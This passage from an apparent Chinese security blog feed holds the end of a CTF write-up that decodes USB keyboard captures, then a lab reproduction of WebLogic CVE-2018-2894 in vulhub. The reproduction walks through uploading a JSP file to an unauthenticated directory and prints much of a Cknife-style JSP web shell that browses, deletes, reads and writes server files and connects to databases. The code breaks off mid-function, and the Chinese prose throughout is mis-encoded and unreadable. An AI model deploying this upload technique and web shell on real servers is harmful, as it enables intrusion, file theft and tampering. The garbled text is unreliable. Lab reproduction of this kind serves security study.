class="number">0</span>:</span><br><span class="line">                output[i]=output[i].upper()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">out(<span class="string">&quot;1.txt&quot;</span>)</span><br><span class="line">out(<span class="string">&quot;2.txt&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/1721631569202-6.png" alt="img"></p><p>output1:16è¿›åˆ¶è½¬åŒ–ä¸ºrarå‹ç¼©åŒ…</p><p>output2:rarå‹ç¼©åŒ…å¯†ç </p><p>flag{20de17cc-d2c1-4b61-bebd-41159ed7172d}</p><h3 id="MoeCTF-2022-usb"><a href="#MoeCTF-2022-usb" class="headerlink" title="[MoeCTF 2022]usb"></a>[MoeCTF 2022]usb</h3><p>æ‰¾ä¸ªç±»ä¼¼é¢˜ç›®ç»ƒä¹ ä¸€ä¸‹</p><p><img src="/img/1721631569202-7.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tshark -r <span class="number">3.</span>pcapng -T fields -e usbhid.data -Y <span class="string">&quot;usb.data_len == 8&quot;</span> -Y <span class="string">&#x27;usb.src ==&quot;2.2.1&quot;&#x27;</span> &gt; <span class="number">3.</span>txt</span><br></pre></td></tr></table></figure><p><strong>åŠ ****ï¼š</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;3.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out3.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># é¼ æ ‡æµé‡çš„è¯lenæ”¹ä¸º8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>é”®ç›˜æµé‡è½¬åŒ–</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>(<span class="params">file</span>):</span><br><span class="line">    keys=<span class="built_in">open</span>(file)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">                 <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">                output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    keys.close()</span><br><span class="line">    </span><br><span class="line">    flag=<span class="number">0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">del</span> output[a]</span><br><span class="line">            <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">                flag+=<span class="number">1</span></span><br><span class="line">                output.pop(i)</span><br><span class="line">                <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                    flag=<span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">                output[i]=output[i].upper()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">out(<span class="string">&quot;3.txt&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/1721631569202-8.png" alt="img"></p><p>moectf{Learned_a6ou7_USB_tr@ffic}</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogicæ¼æ´å¤ç°</title>
      <link href="/2024/07/21/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/07/21/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>ç®€ä»‹ï¼š</p><p>WebLogicæ˜¯ç¾å›½<a href="http://lib.csdn.net/base/oracle">Oracle</a>å…¬å¸å‡ºå“çš„ä¸€ä¸ªapplication serverï¼Œç¡®åˆ‡çš„è¯´æ˜¯ä¸€ä¸ªåŸºäºJAVAEE<a href="http://lib.csdn.net/base/architecture">æ¶æ„</a>çš„ä¸­é—´ä»¶ï¼ŒWebLogicæ˜¯ç”¨äºå¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†å¤§å‹åˆ†å¸ƒå¼Webåº”ç”¨ã€ç½‘ç»œåº”ç”¨å’Œ<a href="http://lib.csdn.net/base/mysql">æ•°æ®åº“</a>åº”ç”¨çš„<a href="http://lib.csdn.net/base/java">Java</a>åº”ç”¨æœåŠ¡å™¨ã€‚å°†Javaçš„åŠ¨æ€åŠŸèƒ½å’Œ<a href="http://lib.csdn.net/base/java">Java </a>Enterpriseæ ‡å‡†çš„å®‰å…¨æ€§å¼•å…¥å¤§å‹ç½‘ç»œåº”ç”¨çš„å¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†ä¹‹ä¸­</p><p><img src="/img/1721567330384-14.png" alt="img"></p><p>åˆå§‹é¡µé¢</p><p><img src="/img/1721567330382-4.png" alt="img"></p><p>è¿™é‡Œæ¨èä¸€ä¸ªæ‰¹é‡æ‰«æè„šæœ¬å·¥å…·</p><p><a href="https://github.com/rabbitmask/WeblogicScan">https://github.com/rabbitmask/WeblogicScan</a></p><h3 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h3><p>ç¯å¢ƒæ­å»ºï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub-master/weblogic/CVE-<span class="number">2018</span>-<span class="number">2894</span></span><br><span class="line">docker-compose up -d    <span class="comment">#dockerä¸Šéƒ¨ç½²,å…³é—­dockeråå†æ¬¡è®¿é—®ç›´æ¥è¾“å…¥å³å¯</span></span><br><span class="line">docker ps   <span class="comment">#æŸ¥çœ‹æ­£åœ¨è¿è¡Œè¿›ç¨‹ï¼Œå‘ç°å…¶æ˜ å°„åˆ°7001ç«¯å£</span></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.228</span><span class="number">.131</span>:<span class="number">7001</span>/console/   <span class="comment">#è®¿é—®7001ï¼Œ192.168.228.131æ˜¯è‡ªå·±çš„ä¸»æœºå</span></span><br><span class="line">docker-compose down   <span class="comment">#å¤ç°ä¹‹åè®°å¾—é”€æ¯é¶åœºï¼Œå¼€å¯å¦ä¸€ä¸ªé¶åœºå‰è¦é”€æ¯å‰ä¸€ä¸ªé¶åœº</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721567330383-5.png" alt="img"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker-compose logs | grep password  <span class="comment">#æŸ¥çœ‹å…¶å¯†ç ä¸ºy9a03WHP</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721567330383-6.png" alt="img"></p><p>ç‚¹å‡»base_domainï¼Œç‚¹å‡»advanceå¤„Enable Web Service Test Pageï¼Œsaveä¿å­˜</p><p><img src="/img/1721567330383-7.png" alt="img"></p><p><img src="/img/1721567330383-8.png" alt="img"></p><p>è®¿é—®<a href="http://your-ip:7001/ws_utc/config.do%EF%BC%8C%E8%AE%BE%E7%BD%AEWork">http://your-ip:7001/ws_utc/config.doï¼Œè®¾ç½®Work</a> Home Dirä¸º<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>ã€‚æˆ‘å°†ç›®å½•è®¾ç½®ä¸º<code>ws_utc</code>åº”ç”¨çš„é™æ€æ–‡ä»¶cssç›®å½•ï¼Œè®¿é—®è¿™ä¸ªç›®å½•æ˜¯æ— éœ€æƒé™çš„ï¼Œè¿™ä¸€ç‚¹å¾ˆé‡è¦ã€‚</p><p><img src="/img/1721567330383-9.png" alt="img"></p><p>ç‚¹å‡»å®‰å…¨ -&gt; å¢åŠ ï¼Œç„¶åä¸Šä¼ 1.jsp,è¿›è¡ŒbpæŠ“åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ—¶é—´æˆ³<strong>1721315515880</strong></p><p><img src="/img/1721567330383-10.png" alt="img"></p><p>ä¸Šä¼ 1.jspè·å–å…¶shell</p><p><img src="/img/1721567330384-11.png" alt="img"></p><p>èšå‰‘è¿æ¥</p><p><img src="/img/1721567330384-12.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;%@page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;</span>%&gt;&lt;%!</span><br><span class="line">    String Pwd = <span class="string">&quot;Cknife&quot;</span>;</span><br><span class="line">    String cs = <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    String EC(String s) throws Exception &#123;<span class="keyword">return</span> new String(s.getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>),cs);&#125;</span><br><span class="line">    </span><br><span class="line">    Connection GC(String s) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(<span class="string">&quot;choraheiheihei&quot;</span>);</span><br><span class="line">        Class.forName(x[<span class="number">0</span>].trim());<span class="keyword">if</span>(x[<span class="number">1</span>].indexOf(<span class="string">&quot;jdbc:oracle&quot;</span>)!=-<span class="number">1</span>)&#123;<span class="keyword">return</span> DriverManager.getConnection(x[<span class="number">1</span>].trim()+<span class="string">&quot;:&quot;</span>+x[<span class="number">4</span>],x[<span class="number">2</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">2</span>],x[<span class="number">3</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">3</span>]);&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Connection c = DriverManager.getConnection(x[<span class="number">1</span>].trim(),x[<span class="number">2</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">2</span>],x[<span class="number">3</span>].equalsIgnoreCase(<span class="string">&quot;[/null]&quot;</span>)?<span class="string">&quot;&quot;</span>:x[<span class="number">3</span>]);<span class="keyword">if</span> (x.length &gt; <span class="number">4</span>) &#123;</span><br><span class="line">                c.setCatalog(x[<span class="number">4</span>]);&#125;<span class="keyword">return</span> c;&#125;&#125;void AA(StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File k = new File(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        File r[] = k.listRoots();<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; r.length; i++) &#123;</span><br><span class="line">            sb.append(r[i].toString().substring(<span class="number">0</span>, <span class="number">2</span>));&#125;&#125;void BB(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File oF = new File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = new java.util.Date(l[i].lastModified());</span><br><span class="line">            sT = fm.<span class="built_in">format</span>(dt);</span><br><span class="line">            sQ = l[i].canRead() ? <span class="string">&quot;R&quot;</span> : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            sQ += l[i].canWrite() ? <span class="string">&quot; W&quot;</span> : <span class="string">&quot;&quot;</span>;<span class="keyword">if</span> (l[i].isDirectory()) &#123;</span><br><span class="line">                sb.append(l[i].getName() + <span class="string">&quot;/\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length()+ <span class="string">&quot;\t&quot;</span> + sQ + <span class="string">&quot;\n&quot;</span>);&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sF+=l[i].getName() + <span class="string">&quot;\t&quot;</span> + sT + <span class="string">&quot;\t&quot;</span> + l[i].length() + <span class="string">&quot;\t&quot;</span>+ sQ + <span class="string">&quot;\n&quot;</span>;&#125;&#125;</span><br><span class="line">        sb.append(sF);&#125;void EE(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);<span class="keyword">if</span> (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();<span class="keyword">for</span> (<span class="built_in">int</span> k = <span class="number">0</span>; k &lt; x.length; k++) &#123;<span class="keyword">if</span> (!x[k].delete()) &#123;EE(x[k].getPath());&#125;&#125;&#125;</span><br><span class="line">        f.delete();&#125;void FF(String s, HttpServletResponse r) throws Exception &#123;</span><br><span class="line">        <span class="built_in">int</span> n;</span><br><span class="line">        byte[] b = new byte[<span class="number">512</span>];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream <span class="keyword">is</span> = new BufferedInputStream(new FileInputStream(s));</span><br><span class="line">        os.write((<span class="string">&quot;-&gt;&quot;</span> + <span class="string">&quot;|&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);<span class="keyword">while</span> ((n = <span class="keyword">is</span>.read(b, <span class="number">0</span>, <span class="number">512</span>)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            os.write(b, <span class="number">0</span>, n);&#125;</span><br><span class="line">        os.write((<span class="string">&quot;|&quot;</span> + <span class="string">&quot;&lt;-&quot;</span>).getBytes(), <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">        os.close();<span class="keyword">is</span>.close();&#125;void GG(String s, String d) throws Exception &#123;</span><br><span class="line">        String h = <span class="string">&quot;0123456789ABCDEF&quot;</span>;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        f.createNewFile();</span><br><span class="line">        FileOutputStream os = new FileOutputStream(f);<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; d.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">            os.write((h.indexOf(d.charAt(i)) &lt;&lt; <span class="number">4</span> | h.indexOf(d.charAt(i + <span class="number">1</span>))));&#125;</span><br><span class="line">        os.close();&#125;void HH(String s, String d) throws Exception &#123;</span><br><span class="line">        File sf = new File(s), df = new File(d);<span class="keyword">if</span> (sf.isDirectory()) &#123;<span class="keyword">if</span> (!df.exists()) &#123;</span><br><span class="line">                df.mkdir();&#125;</span><br><span class="line">            File z[] = sf.listFiles();<span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; z.length; j++) &#123;HH(s + <span 